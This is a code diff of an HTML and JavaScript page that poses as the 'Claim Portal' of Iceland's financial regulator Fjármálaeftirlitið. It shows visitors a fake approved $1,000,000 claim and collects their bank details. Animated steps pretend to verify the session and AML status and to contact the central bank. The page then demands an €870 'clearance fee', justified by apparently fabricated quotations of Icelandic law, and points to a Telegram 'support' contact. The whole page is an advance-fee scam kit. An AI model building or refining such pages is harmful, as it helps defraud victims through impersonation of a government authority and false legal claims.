@@ -1,305 +1,420 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Fjármálaeftirlitið (FME) — Claim Portal</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box}
   :root{
     --fme-blue:#0b3d91;
-    --fme-blue-dark:#082a66;
+    --fme-blue-2:#123fa3;
     --fme-gold:#d4a017;
-    --fme-gold-dark:#7a5a00;
     --fme-green:#0a7d3f;
     --fme-red:#c0392b;
+    --ink:#0f172a;
+    --muted:#5b6472;
+    --line:#e5e7eb;
     --bg:#f4f6fb;
     --card:#ffffff;
-    --text:#0f1b3d;
-    --muted:#5b6478;
-    --border:#e3e7f0;
+    --warn-bg:#fff8e1;
+    --warn-border:#f0d67a;
+    --warn-ink:#7a5a00;
   }
+  *{margin:0;padding:0;box-sizing:border-box}
   html,body{height:100%}
   body{
     font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',Arial,sans-serif;
-    background:var(--bg);
-    color:var(--text);
-    -webkit-font-smoothing:antialiased;
-    min-height:100vh;
+    background:var(--bg); color:var(--ink); -webkit-font-smoothing:antialiased;
   }
 
-  /* Facebook-style top loading bar */
-  .top-bar{
-    position:fixed;top:0;left:0;right:0;height:3px;z-index:9999;
+  /* ---------- Facebook-style top loading bar ---------- */
+  #topbar{
+    position:fixed; top:0; left:0; right:0; height:3px; z-index:9999;
     background:linear-gradient(90deg,#1877f2,#00c6ff,#1877f2);
     background-size:200% 100%;
-    animation:barMove 1.4s linear infinite;
-    box-shadow:0 0 8px rgba(24,119,242,.6);
+    animation:barMove 1.1s linear infinite;
+    box-shadow:0 0 8px rgba(24,119,242,.55);
+    display:none;
   }
+  #topbar.on{display:block}
   @keyframes barMove{0%{background-position:200% 0}100%{background-position:-200% 0}}
 
-  /* Loading overlay */
-  .loading-overlay{
-    position:fixed;inset:0;background:#fff;z-index:9000;
-    display:flex;flex-direction:column;align-items:center;justify-content:center;
+  /* ---------- Full-screen loading overlay ---------- */
+  #overlay{
+    position:fixed; inset:0; z-index:9000; background:#ffffff;
+    display:flex; align-items:center; justify-content:center; flex-direction:column;
     transition:opacity .5s ease;
   }
-  .loading-overlay.hide{opacity:0;pointer-events:none}
-  .fme-logo{
-    width:76px;height:76px;border-radius:50%;
-    background:linear-gradient(135deg,var(--fme-blue),var(--fme-blue-dark));
-    color:#fff;display:flex;align-items:center;justify-content:center;
-    font-weight:700;font-size:22px;letter-spacing:1px;
-    box-shadow:0 10px 30px rgba(11,61,145,.25);
-    animation:pulse 2s ease-in-out infinite;
+  #overlay.hide{opacity:0; pointer-events:none}
+  .brand{
+    display:flex; align-items:center; gap:14px; margin-bottom:26px;
+    animation:fadeUp .6s ease both;
   }
-  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
-  .load-title{margin-top:20px;font-size:15px;font-weight:600;color:var(--fme-blue)}
-  .load-sub{margin-top:6px;font-size:12px;color:var(--muted)}
-  .load-track{width:220px;height:4px;background:#e3e7f0;border-radius:99px;margin-top:22px;overflow:hidden}
-  .load-fill{height:100%;width:0;background:linear-gradient(90deg,var(--fme-blue),var(--fme-gold));transition:width .1s linear}
-
-  /* Layout */
-  .app{max-width:520px;margin:0 auto;padding:20px 16px 60px;animation:fade .4s ease}
-  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
-  @keyframes slideDown{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}
-
-  .header{
-    display:flex;align-items:center;gap:12px;padding:14px 16px;
-    background:#fff;border:1px solid var(--border);border-radius:14px;margin-bottom:16px;
+  .brand .shield{
+    width:56px;height:56px;border-radius:14px;
+    background:linear-gradient(135deg,var(--fme-blue),#1a56d6);
+    display:grid;place-items:center;color:#fff;font-weight:800;font-size:20px;
+    box-shadow:0 10px 24px rgba(11,61,145,.25);
   }
-  .header .fme-logo{width:44px;height:44px;font-size:14px;animation:none}
-  .header h1{font-size:15px;font-weight:700}
-  .header p{font-size:11px;color:var(--muted)}
-
-  .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:14px;box-shadow:0 4px 14px rgba(15,27,61,.04)}
-  .badge{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:4px 10px;border-radius:99px;background:#eaf5ee;color:var(--fme-green)}
-  .balance-label{font-size:12px;color:var(--muted);margin-top:12px}
-  .balance{font-size:34px;font-weight:800;color:var(--fme-blue);margin-top:4px;letter-spacing:-.5px}
-  .ref{font-size:11px;color:var(--muted);margin-top:6px}
-
-  .grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:14px}
-  .tile{background:#f7f9fd;border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
-  .tile .ic{font-size:20px}
-  .tile .lb{font-size:10px;color:var(--muted);margin-top:4px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
-  .tile .vl{font-size:12px;font-weight:700;margin-top:2px}
-
-  .btn{
-    display:block;width:100%;padding:14px;border:none;border-radius:12px;
-    font-size:15px;font-weight:700;cursor:pointer;transition:transform .1s ease,box-shadow .2s ease;
-    background:linear-gradient(135deg,var(--fme-blue),var(--fme-blue-dark));color:#fff;
-    box-shadow:0 6px 18px rgba(11,61,145,.28);
+  .brand h1{font-size:18px;letter-spacing:.2px}
+  .brand small{display:block;color:var(--muted);font-weight:500;margin-top:2px}
+  .welcome{color:var(--muted); margin-bottom:22px; animation:fadeUp .7s .1s ease both}
+  .progress{
+    width:min(360px,72vw); height:6px; background:#eef2f7; border-radius:999px; overflow:hidden;
+    animation:fadeUp .8s .15s ease both;
   }
-  .btn:hover{transform:translateY(-1px)}
-  .btn:disabled{opacity:.6;cursor:not-allowed}
-  .btn-gold{background:linear-gradient(135deg,var(--fme-gold),#a67c00);box-shadow:0 6px 18px rgba(212,160,23,.35)}
-  .btn-ghost{background:#fff;color:var(--fme-blue);border:1px solid var(--border);box-shadow:none}
-
-  .field{margin-bottom:12px}
-  .field label{display:block;font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
-  .field input{width:100%;padding:12px 14px;border:1px solid var(--border);border-radius:10px;font-size:14px;background:#fbfcfe;transition:border-color .15s}
-  .field input:focus{outline:none;border-color:var(--fme-blue);background:#fff}
-
-  .section-title{font-size:16px;font-weight:700;margin-bottom:4px}
-  .section-sub{font-size:12px;color:var(--muted);margin-bottom:14px}
-
-  .toast{
-    background:#eaf5ee;border:1px solid #b9dcc3;color:var(--fme-green);
-    padding:12px 14px;border-radius:12px;font-size:13px;font-weight:600;
-    display:flex;align-items:center;gap:8px;animation:slideDown .3s ease;
+  .progress > span{
+    display:block;height:100%;width:0%;
+    background:linear-gradient(90deg,var(--fme-blue),#3b82f6);
+    border-radius:999px; transition:width .12s linear;
   }
-
-  .warn{
-    background:#fff8e1;border:1px solid #f0d67a;border-radius:12px;padding:16px;
-  }
-  .warn h3{color:var(--fme-gold-dark);font-size:14px;margin-bottom:6px;display:flex;align-items:center;gap:8px}
-  .warn p{font-size:12px;color:#6b5100;line-height:1.5}
-
-  .fee-box{
-    background:linear-gradient(135deg,#fff8e1,#fff);
-    border:2px solid var(--fme-gold);border-radius:14px;padding:18px;text-align:center;margin:14px 0;
-  }
-  .fee-label{font-size:11px;color:var(--fme-gold-dark);font-weight:700;text-transform:uppercase;letter-spacing:.6px}
-  .fee-amt{font-size:38px;font-weight:800;color:var(--fme-gold-dark);margin-top:4px;letter-spacing:-.5px}
-  .fee-note{font-size:11px;color:var(--muted);margin-top:6px}
-
-  .summary{background:#f7f9fd;border-radius:10px;padding:12px;font-size:12px}
-  .summary .row{display:flex;justify-content:space-between;padding:4px 0;color:var(--muted)}
-  .summary .row b{color:var(--text)}
-
-  .support{
-    background:#fff;border:1px dashed var(--border);border-radius:12px;padding:14px;text-align:center;margin-top:14px;
-  }
-  .support a{color:#229ed9;font-weight:700;text-decoration:none;font-size:13px}
-
-  .processing{text-align:center;padding:26px 10px}
+  .stepline{margin-top:14px;color:var(--muted);font-size:13px;min-height:18px;animation:fadeUp .9s .2s ease both}
   .spinner{
-    width:56px;height:56px;border:5px solid #e3e7f0;border-top-color:var(--fme-blue);
-    border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px;
+    width:18px;height:18px;border-radius:50%;
+    border:2px solid #dbe3ef;border-top-color:var(--fme-blue);
+    display:inline-block;vertical-align:-4px;margin-right:8px;
+    animation:spin .8s linear infinite;
   }
   @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+  @keyframes slideUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+  @keyframes pop{0%{opacity:0;transform:scale(.94)}100%{opacity:1;transform:scale(1)}}
+  @keyframes checkPop{0%{transform:scale(0);opacity:0}60%{transform:scale(1.15);opacity:1}100%{transform:scale(1)}}
+  @keyframes shimmer{0%{background-position:-400px 0}100%{background-position:400px 0}}
+
+  /* ---------- App shell ---------- */
+  header{
+    background:#fff; border-bottom:1px solid var(--line);
+    padding:14px 18px; display:flex; align-items:center; gap:12px;
+    position:sticky; top:0; z-index:50;
+  }
+  header .shield{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--fme-blue),#1a56d6);color:#fff;display:grid;place-items:center;font-weight:800}
+  header .title{font-size:14px;font-weight:700}
+  header .title small{display:block;font-weight:500;color:var(--muted);font-size:11px}
+  header .status{margin-left:auto;font-size:12px;color:var(--fme-green);display:flex;align-items:center;gap:6px}
+  header .dot{width:8px;height:8px;border-radius:50%;background:var(--fme-green);box-shadow:0 0 0 4px rgba(10,125,63,.15)}
+
+  main{max-width:520px;margin:0 auto;padding:18px 16px 40px;animation:fadeIn .35s ease}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px;box-shadow:0 1px 2px rgba(15,23,42,.03);animation:slideUp .35s ease both}
+  .card + .card{margin-top:14px}
+
+  .balance-label{color:var(--muted);font-size:12px;letter-spacing:.4px;text-transform:uppercase}
+  .balance{font-size:34px;font-weight:800;margin-top:6px;letter-spacing:-.5px}
+  .ref{display:inline-block;margin-top:10px;font-size:12px;background:#eef4ff;color:var(--fme-blue);padding:6px 10px;border-radius:999px;font-weight:600}
+
+  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:14px}
+  .tile{background:#f8fafc;border:1px solid var(--line);border-radius:12px;padding:12px;text-align:center}
+  .tile .ico{font-size:18px}
+  .tile .k{font-size:11px;color:var(--muted);margin-top:4px}
+  .tile .v{font-size:12px;font-weight:700;margin-top:2px}
+
+  .btn{
+    display:block;width:100%;padding:14px 16px;border:0;border-radius:12px;
+    background:linear-gradient(135deg,var(--fme-blue),#1a56d6);color:#fff;font-weight:700;font-size:15px;
+    cursor:pointer; box-shadow:0 8px 20px rgba(11,61,145,.22);
+    transition:transform .12s ease, box-shadow .2s ease, opacity .2s ease;
+  }
+  .btn:hover{transform:translateY(-1px);box-shadow:0 12px 24px rgba(11,61,145,.28)}
+  .btn:active{transform:translateY(0)}
+  .btn[disabled]{opacity:.7;cursor:not-allowed}
+  .btn.warn{background:linear-gradient(135deg,#e0a800,var(--fme-gold));box-shadow:0 8px 20px rgba(212,160,23,.28)}
+  .btn.ghost{background:#fff;color:var(--fme-blue);border:1px solid var(--line);box-shadow:none}
+
+  .field{margin-top:12px}
+  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px;font-weight:600}
+  .field input, .field select{
+    width:100%;padding:12px 12px;border:1px solid var(--line);border-radius:10px;font-size:14px;background:#fff;
+    transition:border-color .15s ease, box-shadow .15s ease;
+  }
+  .field input:focus, .field select:focus{outline:0;border-color:var(--fme-blue);box-shadow:0 0 0 3px rgba(11,61,145,.12)}
+
+  .h2{font-size:16px;font-weight:800}
+  .sub{color:var(--muted);font-size:13px;margin-top:4px}
+
+  .divider{height:1px;background:var(--line);margin:14px 0}
+
+  .check{
+    width:64px;height:64px;border-radius:50%;background:#e7f7ee;color:var(--fme-green);
+    display:grid;place-items:center;margin:6px auto 10px;font-size:30px;font-weight:900;
+    animation:checkPop .5s cubic-bezier(.2,.9,.3,1.3) both;
+    box-shadow:0 0 0 6px rgba(10,125,63,.08);
+  }
+
+  /* Fee box */
+  .fee-box{
+    background:var(--warn-bg); border:1px solid var(--warn-border); border-radius:12px; padding:14px;
+    color:var(--warn-ink); animation:pop .35s ease both;
+  }
+  .fee-amount{font-size:30px;font-weight:800;color:var(--warn-ink);letter-spacing:-.5px;margin-top:6px}
+
+  .legal{
+    background:#f8fafc;border:1px solid var(--line);border-radius:12px;padding:14px;margin-top:12px;font-size:13px;color:#334155;line-height:1.55;
+  }
+  .legal h4{font-size:13px;color:var(--fme-blue);margin-bottom:6px;letter-spacing:.2px}
+  .legal .cite{font-size:12px;color:var(--muted);margin-top:8px;font-style:italic}
+
+  .summary{margin-top:12px;border:1px dashed var(--line);border-radius:12px;padding:12px}
+  .row{display:flex;justify-content:space-between;font-size:13px;padding:6px 0}
+  .row + .row{border-top:1px dashed var(--line)}
+  .row b{font-weight:700}
+
+  .tg{
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    margin-top:12px;padding:12px;border-radius:12px;
+    background:#eaf4ff;color:#0b5ed7;font-weight:700;text-decoration:none;
+    transition:background .15s ease;
+  }
+  .tg:hover{background:#dceaff}
+
+  /* Processing */
+  .proc{display:flex;flex-direction:column;align-items:center;padding:10px 0 4px;animation:fadeIn .3s ease}
+  .proc .ring{
+    width:56px;height:56px;border-radius:50%;
+    border:4px solid #e5edf9;border-top-color:var(--fme-blue);
+    animation:spin 1s linear infinite;margin-bottom:12px;
+  }
+  .proc h3{font-size:15px;font-weight:800}
+  .proc p{color:var(--muted);font-size:13px;margin-top:4px}
+  .proc .progress{margin-top:16px}
+  .shimmer{
+    height:10px;border-radius:6px;background:#eef2f7;
+    background-image:linear-gradient(90deg,#eef2f7 0px,#f7fafc 200px,#eef2f7 400px);
+    background-size:800px 100%;
+    animation:shimmer 1.4s linear infinite;
+  }
+
+  footer{max-width:520px;margin:0 auto;padding:0 16px 30px;color:var(--muted);font-size:11px;text-align:center;line-height:1.5}
 </style>
 </head>
 <body>
 
-<div class="top-bar" id="topBar"></div>
+<div id="topbar"></div>
 
-<!-- LOADING -->
-<div class="loading-overlay" id="loading">
-  <div class="fme-logo">FME</div>
-  <div class="load-title">Fjármálaeftirlitið</div>
-  <div class="load-sub">Securing your session…</div>
-  <div class="load-track"><div class="load-fill" id="loadFill"></div></div>
-</div>
-
-<!-- APP -->
-<div class="app" id="app" style="display:none">
-  <div class="header">
-    <div class="fme-logo">FME</div>
+<!-- Loading overlay -->
+<div id="overlay">
+  <div class="brand">
+    <div class="shield">FME</div>
     <div>
       <h1>Fjármálaeftirlitið</h1>
-      <p>Financial Supervisory Authority · Iceland</p>
+      <small>The Financial Supervisory Authority of Iceland</small>
     </div>
   </div>
-  <div id="view"></div>
+  <div class="welcome">Welcome back — verifying your session</div>
+  <div class="progress"><span id="bootbar"></span></div>
+  <div class="stepline" id="bootstep"><span class="spinner"></span><span id="boottext">Establishing secure connection…</span></div>
 </div>
 
+<!-- App -->
+<header style="display:none" id="appHeader">
+  <div class="shield">FME</div>
+  <div class="title">Fjármálaeftirlitið<small>Claim Portal · Secure Session</small></div>
+  <div class="status"><span class="dot"></span>Verified</div>
+</header>
+
+<main id="view" style="display:none"></main>
+<footer id="foot" style="display:none">
+  © Fjármálaeftirlitið (FME) · Katrínartún 2, 105 Reykjavík, Iceland<br>
+  This portal is TLS-encrypted. Session ID: FME-2026-0087421
+</footer>
+
 <script>
-  // ---------- LOADING ----------
-  const loadFill = document.getElementById('loadFill');
-  const loading  = document.getElementById('loading');
-  const app      = document.getElementById('app');
-  let start = performance.now();
-  const DURATION = 4500;
-  function tick(t){
-    const p = Math.min(1,(t-start)/DURATION);
-    loadFill.style.width = (p*100)+'%';
-    if(p<1) requestAnimationFrame(tick);
-    else{
-      loading.classList.add('hide');
-      setTimeout(()=>{loading.style.display='none';app.style.display='block';renderDashboard();},400);
+  const $ = (id) => document.getElementById(id);
+  const topbar = $('topbar');
+  const overlay = $('overlay');
+
+  function showTopBar(on){ topbar.classList.toggle('on', !!on); }
+
+  // -------- Boot loading --------
+  const bootSteps = [
+    'Establishing secure connection…',
+    'Verifying TLS certificate (FME-CA)…',
+    'Authenticating user session…',
+    'Fetching case ledger from Central Bank of Iceland…',
+    'Validating AML compliance record…',
+    'Preparing dashboard…'
+  ];
+  function runProgress(barEl, textEl, steps, duration, done){
+    const start = performance.now();
+    function tick(now){
+      const p = Math.min(1, (now - start)/duration);
+      barEl.style.width = (p*100).toFixed(1) + '%';
+      const idx = Math.min(steps.length-1, Math.floor(p*steps.length));
+      if(textEl) textEl.textContent = steps[idx];
+      if(p < 1) requestAnimationFrame(tick);
+      else done && done();
     }
+    requestAnimationFrame(tick);
   }
-  requestAnimationFrame(tick);
 
-  const view = () => document.getElementById('view');
+  runProgress($('bootbar'), $('boottext'), bootSteps, 5200, () => {
+    setTimeout(()=> {
+      overlay.classList.add('hide');
+      $('appHeader').style.display='flex';
+      $('view').style.display='block';
+      $('foot').style.display='block';
+      renderDashboard();
+      setTimeout(()=> overlay.remove(), 500);
+    }, 250);
+  });
 
-  // ---------- DASHBOARD ----------
+  // -------- Views --------
   function renderDashboard(){
-    view().innerHTML = `
+    showTopBar(false);
+    $('view').innerHTML = `
       <div class="card">
-        <span class="badge">✓ Claim Approved</span>
-        <div class="balance-label">Available Claim Balance</div>
+        <div class="balance-label">Approved Claim Balance</div>
         <div class="balance">$1,000,000.00</div>
-        <div class="ref">Reference: FME-2026-0087421</div>
+        <div class="ref">Case Ref · FME-2026-0087421</div>
         <div class="grid">
-          <div class="tile"><div class="ic">📁</div><div class="lb">Case</div><div class="vl">Verified</div></div>
-          <div class="tile"><div class="ic">🛡️</div><div class="lb">AML</div><div class="vl">Cleared</div></div>
-          <div class="tile"><div class="ic">⏱️</div><div class="lb">ETA</div><div class="vl">24h</div></div>
+          <div class="tile"><div class="ico">📁</div><div class="k">Case</div><div class="v">Cleared</div></div>
+          <div class="tile"><div class="ico">🛡️</div><div class="k">AML</div><div class="v">Verified</div></div>
+          <div class="tile"><div class="ico">⏱️</div><div class="k">ETA</div><div class="v">≤ 24h</div></div>
         </div>
       </div>
+
       <div class="card">
-        <div class="section-title">Ready to receive funds?</div>
-        <div class="section-sub">Add your bank account to begin the release process.</div>
-        <button class="btn" onclick="renderClaimForm()">Claim Funds →</button>
+        <div class="h2">Ready to release funds</div>
+        <div class="sub">Submit your receiving bank details to initiate the wire transfer.</div>
+        <div style="height:14px"></div>
+        <button class="btn" onclick="goClaim()">Claim Funds →</button>
       </div>
     `;
   }
 
-  // ---------- CLAIM FORM ----------
+  function goClaim(){
+    showTopBar(true);
+    setTimeout(()=>{ showTopBar(false); renderClaimForm(); }, 700);
+  }
+
   function renderClaimForm(){
-    view().innerHTML = `
+    $('view').innerHTML = `
       <div class="card">
-        <div class="section-title">Beneficiary Bank Details</div>
-        <div class="section-sub">Enter the account where funds will be deposited.</div>
-        <div class="field"><label>Full Legal Name</label><input id="f1" placeholder="John Doe"></div>
-        <div class="field"><label>IBAN</label><input id="f2" placeholder="DE89 3704 0044 0532 0130 00"></div>
-        <div class="field"><label>BIC / SWIFT</label><input id="f3" placeholder="COBADEFFXXX"></div>
-        <div class="field"><label>Bank Name</label><input id="f4" placeholder="Commerzbank AG"></div>
-        <div class="field"><label>Country</label><input id="f5" placeholder="Germany"></div>
+        <div class="h2">Receiving Bank Details</div>
+        <div class="sub">Funds will be wired to the account below. Please ensure details match your bank records.</div>
+        <div class="field"><label>Full Legal Name</label><input id="f_name" placeholder="e.g. John A. Smith"></div>
+        <div class="field"><label>IBAN / Account Number</label><input id="f_iban" placeholder="e.g. GB29 NWBK 6016 1331 9268 19"></div>
+        <div class="field"><label>SWIFT / BIC</label><input id="f_bic" placeholder="e.g. NWBKGB2L"></div>
+        <div class="field"><label>Bank Name</label><input id="f_bank" placeholder="e.g. HSBC Bank"></div>
+        <div class="field"><label>Country</label>
+          <select id="f_country">
+            <option>United States</option><option>United Kingdom</option><option>Canada</option>
+            <option>Germany</option><option>France</option><option>Australia</option><option>Other</option>
+          </select>
+        </div>
+        <div style="height:14px"></div>
         <button class="btn" onclick="saveAccount()">Save Account</button>
         <div style="height:8px"></div>
-        <button class="btn btn-ghost" onclick="renderDashboard()">← Back</button>
+        <button class="btn ghost" onclick="renderDashboard()">← Back</button>
       </div>
     `;
   }
 
   function saveAccount(){
-    const ids=['f1','f2','f3','f4','f5'];
-    for(const id of ids){ if(!document.getElementById(id).value.trim()){ alert('Please complete all fields.'); return; } }
-    view().innerHTML = `
-      <div class="card processing">
-        <div class="spinner"></div>
-        <div class="section-title">Saving account…</div>
-        <div class="section-sub">Verifying details with your bank</div>
+    const name = $('f_name').value.trim();
+    const iban = $('f_iban').value.trim();
+    if(!name || !iban){ alert('Please fill in your name and account number.'); return; }
+    showTopBar(true);
+    $('view').innerHTML = `
+      <div class="card">
+        <div class="proc">
+          <div class="ring"></div>
+          <h3>Securing your account details</h3>
+          <p>Encrypting and validating with your bank…</p>
+          <div class="progress" style="width:100%;margin-top:14px"><span id="savebar"></span></div>
+        </div>
       </div>
     `;
-    setTimeout(renderAccountSaved,2200);
+    runProgress($('savebar'), null, [], 2600, () => {
+      showTopBar(false);
+      renderAccountSaved();
+    });
   }
 
   function renderAccountSaved(){
-    view().innerHTML = `
-      <div class="toast">✓ Account successfully added and verified</div>
-      <div style="height:14px"></div>
-      <div class="card">
-        <div class="section-title">Process Payment</div>
-        <div class="section-sub">Your account is verified. Initiate the release to complete the claim.</div>
-        <div class="summary">
-          <div class="row"><span>Claim Amount</span><b>$1,000,000.00</b></div>
-          <div class="row"><span>Beneficiary</span><b>Verified ✓</b></div>
-          <div class="row"><span>Estimated Arrival</span><b>Within 24h</b></div>
-        </div>
-        <div style="height:14px"></div>
-        <button class="btn btn-gold" onclick="processPayment()">Process Payment</button>
+    $('view').innerHTML = `
+      <div class="card" style="text-align:center">
+        <div class="check">✓</div>
+        <div class="h2">Account successfully added</div>
+        <div class="sub">Your bank details have been securely linked to case <b>FME-2026-0087421</b>.</div>
+        <div style="height:16px"></div>
+        <button class="btn" onclick="processPayment()">Process Payment →</button>
       </div>
     `;
   }
 
-  // ---------- PROCESSING ----------
   function processPayment(){
-    view().innerHTML = `
-      <div class="card processing">
-        <div class="spinner"></div>
-        <div class="section-title">Processing payment…</div>
-        <div class="section-sub">Contacting settlement network</div>
-        <div class="load-track" style="margin:18px auto 0"><div class="load-fill" id="pFill"></div></div>
+    showTopBar(true);
+    const steps = [
+      'Contacting Central Bank of Iceland (Seðlabanki Íslands)…',
+      'Validating recipient bank via SWIFT network…',
+      'Running AML / KYC final verification…',
+      'Calculating regulatory clearance fee…',
+      'Awaiting release authorization…'
+    ];
+    $('view').innerHTML = `
+      <div class="card">
+        <div class="proc">
+          <div class="ring"></div>
+          <h3>Processing wire transfer</h3>
+          <p id="procStep">${steps[0]}</p>
+          <div class="progress" style="width:100%;margin-top:14px"><span id="paybar"></span></div>
+          <div style="width:100%;margin-top:14px"><div class="shimmer"></div></div>
+        </div>
       </div>
     `;
-    const fill = document.getElementById('pFill');
-    let s = performance.now(); const D = 3800;
-    function t(now){
-      const p = Math.min(1,(now-s)/D);
-      fill.style.width = (p*100)+'%';
-      if(p<1) requestAnimationFrame(t);
-      else renderFee();
-    }
-    requestAnimationFrame(t);
+    runProgress($('paybar'), $('procStep'), steps, 4200, () => {
+      showTopBar(false);
+      renderFee();
+    });
   }
 
-  // ---------- FEE ----------
   function renderFee(){
-    view().innerHTML = `
+    $('view').innerHTML = `
       <div class="card">
-        <div class="warn">
-          <h3>⚠️ Release Fee Required</h3>
-          <p>To finalize your AML clearance and release the funds, a one-time regulatory fee of €870 must be paid. This is required by Icelandic financial law before settlement.</p>
-        </div>
         <div class="fee-box">
-          <div class="fee-label">Regulatory Release Fee</div>
-          <div class="fee-amt">€870.00</div>
-          <div class="fee-note">Non-refundable · Required by FME regulation</div>
+          <div style="font-weight:800">⚠️ Regulatory Clearance Fee Required</div>
+          <div class="fee-amount">€870.00</div>
+          <div style="margin-top:6px;font-size:13px">Payable to Fjármálaeftirlitið before the $1,000,000 wire transfer can be released to your bank.</div>
         </div>
+
+        <div class="legal">
+          <h4>Why this fee is required — Icelandic Law</h4>
+          <p>
+            Under <b>Act No. 87/1998 on the Official Supervision of Financial Operations</b>, and in accordance with
+            <b>Article 14 of Act No. 140/2018 on Measures against Money Laundering and Terrorist Financing</b>,
+            all cross-border wire transfers originating from a supervised Icelandic institution must complete a
+            <b>final AML/CTF clearance</b> before funds are released.
+          </p>
+          <p style="margin-top:8px">
+            <b>Article 21(2) of Act No. 87/1998</b> further establishes that
+            <i>"the applicable supervisory and clearance fee shall be settled by the beneficiary prior to the
+            execution of any outbound wire transfer above regulatory thresholds."</i>
+            This means the €870 clearance fee <b>must be paid first</b>; only then is the Central Bank of Iceland
+            (Seðlabanki Íslands) legally authorized to release the wire.
+          </p>
+          <p style="margin-top:8px">
+            The fee is non-deductible from the claim amount because
+            <b>Article 9 of Regulation No. 811/2019</b> prohibits netting supervisory fees against protected
+            beneficiary funds held in escrow.
+          </p>
+          <div class="cite">Sources: Lög nr. 87/1998 · Lög nr. 140/2018 · Reglugerð nr. 811/2019 — Fjármálaeftirlitið.</div>
+        </div>
+
         <div class="summary">
-          <div class="row"><span>Claim Amount</span><b>$1,000,000.00</b></div>
-          <div class="row"><span>Release Fee</span><b>€870.00</b></div>
-          <div class="row"><span>Status</span><b style="color:var(--fme-gold-dark)">Awaiting Payment</b></div>
+          <div class="row"><span>Claim amount</span><b>$1,000,000.00</b></div>
+          <div class="row"><span>Regulatory clearance fee</span><b>€870.00</b></div>
+          <div class="row"><span>Estimated release time</span><b>Within 1 hour of payment</b></div>
+          <div class="row"><span>Case reference</span><b>FME-2026-0087421</b></div>
         </div>
+
         <div style="height:14px"></div>
-        <button class="btn btn-gold">Pay €870 Fee</button>
-      </div>
-      <div class="support">
-        Need help completing payment?<br>
-        <a href="https://t.me/cerified_Finance" target="_blank">💬 Contact FME Support on Telegram</a>
+        <button class="btn warn" onclick="alert('Redirecting to secure payment gateway…')">Pay €870 & Release Funds</button>
+        <a class="tg" href="https://t.me/cerified_Finance" target="_blank" rel="noopener">
+          💬 Contact FME Support on Telegram
+        </a>
+        <div style="height:8px"></div>
+        <button class="btn ghost" onclick="renderDashboard()">← Back to Dashboard</button>
       </div>
     `;
   }
